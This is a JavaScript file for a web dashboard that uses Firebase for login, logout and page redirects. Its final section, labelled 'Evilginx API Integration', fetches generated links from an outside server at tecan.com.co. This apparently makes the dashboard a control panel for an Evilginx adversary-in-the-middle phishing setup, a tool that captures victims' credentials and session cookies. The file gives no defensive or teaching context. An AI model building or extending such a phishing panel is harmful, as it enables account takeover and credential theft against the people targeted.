console.log("✅ Script.js loaded successfully");

// ✅ Ensure Firebase is loaded before calling it
document.addEventListener("DOMContentLoaded", () => {
    if (typeof firebase === "undefined") {
        console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
        return;
    }

    checkAuthStatus();
});

// ✅ Check Authentication & Redirect
function checkAuthStatus() {
    firebase.auth().onAuthStateChanged(user => {
        if (user) {
            console.log("✅ User logged in:", user.email);
            if (window.location.pathname.includes("index.html")) {
                window.location.href = "dashboard.html";
            }
        } else {
            console.log("❌ User not logged in.");
            if (window.location.pathname.includes("dashboard.html")) {
                window.location.href = "index.html";
            }
        }
    });
}

// ✅ Login Function
function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then(userCredential => {
            console.log("✅ Login successful:", userCredential.user.email);
            window.location.href = "dashboard.html";
        })
        .catch(error => {
            console.error("❌ Login failed:", error.message);
            alert("Login failed: " + error.message);
        });
}

// ✅ Logout Function
function logout() {
    firebase.auth().signOut().then(() => {
        console.log("✅ User logged out.");
        window.location.href = "index.html";
    }).catch(error => {
        console.error("❌ Logout failed:", error.message);
    });
}

// ✅ Evilginx API Integration
const EVILGINX_SERVER = "http://tecan.com.co:5000"; // Update this

function generateLink() {
    fetch(`${EVILGINX_SERVER}/generate_link`)
        .then(response => response.json())
        .then(data => {
            if (data.link) {
                document.getElementById("generatedLink").innerText = `Generated Link: ${data.link}`;
                console.log("✅ Link generated successfully:", data.link);
            } else {
                console.error("❌ Error generating link:", data);
                alert("Failed to generate link.");
            }
        })
        .catch(error => {
            console.error("❌ Error generating link:", error);
            alert("Error generating link. Check server status.");
        });
}
